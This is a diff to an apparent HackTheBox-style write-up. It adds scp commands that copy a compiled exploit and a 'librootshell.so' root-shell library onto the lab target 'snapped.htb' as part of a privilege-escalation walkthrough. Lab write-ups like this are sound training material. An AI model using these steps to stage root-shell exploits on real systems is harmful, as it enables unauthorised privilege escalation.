@@ -336,6 +336,17 @@ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
 Ill run both these commands to compile the exploit.
 
 ```python
+scp exploit jonathan@snapped.htb:/home/jonathan/Documents 
+jonathan@snapped.htb's password: 
+exploit
+
+scp librootshell.so jonathan@snapped.htb:/home/jonathan/Documents 
+jonathan@snapped.htb's password: 
+librootshell.so
+```
+Ill transfer both to the target
+
+```python
 
 ```
 
